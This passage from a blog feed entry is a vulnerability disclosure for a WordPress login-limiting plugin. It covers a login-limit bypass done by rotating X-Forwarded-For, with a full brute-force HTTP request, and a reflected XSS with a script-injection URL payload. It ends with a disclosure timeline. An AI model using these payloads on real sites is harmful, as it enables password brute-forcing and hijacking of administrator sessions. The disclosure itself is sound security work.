value:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/a2b2bb006b2755547f9cea621ef876f9.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;The second list can be every string, even simply incrementing the numbers from 1 to 10:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/a74e12d142d248c2dbeb26c3da5b861c.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;Indeed, the attacker is able to bypass the limit and potentially found the login credentials:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ae90b88a08842a87e672f46618815258.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;Please note that custom headers are allowed using the following format, as an example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Plugin settings value name:&lt;/strong&gt; HTTP_X_PIPPO&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP request header name:&lt;/strong&gt; X-Pippo&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Payload used to exploit the vulnerability, changing the value of &lt;em&gt;X-Forwarded-For&lt;/em&gt; on every attempt:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /wp-login.php HTTP/1.1Host: wordpressUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 1Connection: closeCookie: wordpress_test_cookie=WP+Cookie+checkUpgrade-Insecure-Requests: 1log=admin&amp;amp;pwd=password&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fwordpress%2Fwp-admin%2F&amp;amp;testcookie=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Brute-force tool&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;I have released a brute-force tool on my &lt;a href=&#34;https://github.com/N4nj0/CVE-2020-35590&#34;&gt;GitHub repo&lt;/a&gt;.&lt;/p&gt;&lt;h3 id=&#34;2-improper-neutralization-of-input-during-web-page-generation-reflected-cross-site-scripting-cwe-79&#34;&gt;&lt;strong&gt;2 - Improper Neutralization of Input During Web Page Generation (Reflected Cross-Site Scripting) - CWE-79&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against the platform administrators.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; The plugin needs to be installed and activated on WordPress. No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35589&#34;&gt;CVE-2020-35589&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35589&#34;&gt;&lt;strong&gt;5.4&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A malicious user can cause an administrator user to supply dangerous content to the vulnerable page, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints:&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://wordpress/wp-admin/options-general.php?page=limit-login-attempts&#34;&gt;http://wordpress/wp-admin/options-general.php?page=limit-login-attempts&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; tab&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;While the administrator user is logged in to WordPress, visit the page in the payload section.&lt;/p&gt;&lt;p&gt;The data is read directly from the HTTP request and reflected back in the HTTP response:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/302048013468d6eba771107208a3dad7.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;Execution of the JavaScript payload in the browser context:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/33140a21ad94526170270a3d087c2a9d.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;Payload used to exploit the vulnerability:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://wordpress/wp-admin/options-general.php?page=limit-login-attempts&amp;amp;tab=d7raf&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Please note that the &lt;strong&gt;options-general.php&lt;/strong&gt; page is only available to WordPress administrators. Lower privileged users are not affected because the page is forbidden for them (error 403).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to target administrator users who are able to access the plugin configuration page within the browser with several type of direct or indirect impacts such as stealing cookies (if the HttpOnly flag is missing from the session cookies), modifying a web page, capturing clipboard contents, keylogging, port scanning, dynamic downloads and other attacks. This type of reflected XSS does require user interaction.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;14/06/2020&lt;/strong&gt;: First disclosure to WP Plugin Team plugins@wordpress.org&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;23/06/2020&lt;/strong&gt;: Ping request to WP Plugin Team for reading the mail. They reply asking for waiting 60 days for publishing the issues.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;24/07/2020&lt;/strong&gt;: Ping request to WP Plugin Team for news. Destination Host Unreachable (Spoiler: No response 😳)&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;15/09/2020&lt;/strong&gt;: Contacted directly the developer via mail address. No response till day.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;14/12/2020&lt;/strong&gt;: Testing if those vulnerabilities apply to latest version to date, 2.17.4. The developer has fixed both, but not notified users. Thus, releasing.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;21/12/2020&lt;/strong&gt;: MITRE released&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35589&#34;&gt;CVE-2020-35589&lt;/a&gt; and &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35590&#34;&gt;CVE-2020-35590&lt;/a&gt;.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;22/12/2020&lt;/strong&gt;: NVD scored&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35589&#34;&gt;CVE-2020-35589&lt;/a&gt; as &lt;strong&gt;5.4&lt;/strong&gt; (Medium) and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35590&#34;&gt;CVE-2020-35590&lt;/a&gt; as &lt;strong&gt;9.8&lt;/strong&gt; (Critical).&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;24/12/2020&lt;/strong&gt;: Released exploit for CVE-2020-35590 on my &lt;a href=&#34;https://github.com/N4nj0/CVE-2020-35590&#34;&gt;GitHub repo&lt;/a&gt;. Find your perfect Christmas gift 🎅&lt;br /&gt;&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
 </channel>
</rss>
